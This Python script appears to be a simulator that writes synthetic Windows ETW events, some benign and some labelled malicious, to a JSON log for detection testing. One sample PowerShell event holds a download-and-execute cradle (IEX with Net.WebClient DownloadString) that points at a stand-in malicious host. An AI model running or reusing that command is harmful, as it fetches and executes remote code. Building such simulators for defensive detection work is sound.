#!/usr/bin/env python3
import json
import time
import random
import datetime
from pathlib import Path

class ETWSimulator:
    def __init__(self):
        self.log_file = "etw_events.json"
        self.events = []
    
    def generate_wmi_event(self, malicious=False):
        timestamp = datetime.datetime.now().isoformat()
        if malicious:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-WMI-Activity",
                "event_id": 5857,
                "level": "Information",
                "process_name": "wmiprvse.exe",
                "command_line": "SELECT * FROM Win32_Process WHERE Name='cmd.exe'",
                "user": "SYSTEM",
                "suspicious": True,
                "indicators": ["process_enumeration", "system_account"]
            }
        else:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-WMI-Activity",
                "event_id": 5858,
                "level": "Information",
                "process_name": "wmiprvse.exe",
                "command_line": "SELECT * FROM Win32_ComputerSystem",
                "user": "Administrator",
                "suspicious": False,
                "indicators": []
            }
        return event
    
    def generate_powershell_event(self, malicious=False):
        timestamp = datetime.datetime.now().isoformat()
        if malicious:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-PowerShell",
                "event_id": 4104,
                "level": "Warning",
                "process_name": "powershell.exe",
                "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
                "user": "user01",
                "suspicious": True,
                "indicators": ["download_string", "invoke_expression", "external_url"]
            }
        else:
            event = {
                "timestamp": timestamp,
                "provider": "Microsoft-Windows-PowerShell",
                "event_id": 4103,
                "level": "Information",
                "process_name": "powershell.exe",
                "script_block": "Get-Process | Where-Object {$_.CPU -gt 100}",
                "user": "Administrator",
                "suspicious": False,
                "indicators": []
            }
        return event
    
    def simulate_events(self, count=50):
        print(f"Generating {count} ETW events...")
        for i in range(count):
            # Generate mix of normal and malicious events
            if random.random() < 0.3:  # 30% malicious
                if random.random() < 0.5:
                    event = self.generate_wmi_event(malicious=True)
                else:
                    event = self.generate_powershell_event(malicious=True)
            else:
                if random.random() < 0.5:
                    event = self.generate_wmi_event(malicious=False)
                else:
                    event = self.generate_powershell_event(malicious=False)
            
            self.events.append(event)
            
            # Write to log file in real-time
            with open(self.log_file, 'a') as f:
                f.write(json.dumps(event) + '\n')
            
            time.sleep(0.1)  # Simulate real-time events
        
        print(f"Generated {len(self.events)} events in {self.log_file}")

if __name__ == "__main__":
    simulator = ETWSimulator()
    simulator.simulate_events(100)
